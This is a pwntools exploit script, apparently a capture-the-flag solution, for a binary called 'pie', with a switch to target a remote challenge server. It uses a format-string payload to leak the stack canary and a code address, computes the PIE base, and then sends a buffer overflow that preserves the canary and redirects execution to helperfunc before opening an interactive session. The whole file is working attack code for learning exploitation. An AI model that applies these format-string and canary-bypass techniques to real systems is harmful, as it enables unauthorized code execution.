#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./pie')

if args.REMOTE:
	p = remote('pwnremote.threatsims.com', 9002)
else:
	p = process(binary.path)

p.sendlineafter('?\n','%11$10p%15$10p')
p.recvuntil('command: ')
canary = int(p.recv(10),16)
log.info('canary: ' + hex(canary))
main = int(p.recv(10),16) - 95
log.info('main: ' + hex(main))
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))

payload  = b''
payload += (0x21 - 0x10) * b'A'
payload += p32(canary)
payload += (0x21 - len(payload)) * b'B'
payload += p32(binary.sym.helperfunc)

p.sendlineafter('?',payload)
p.interactive()

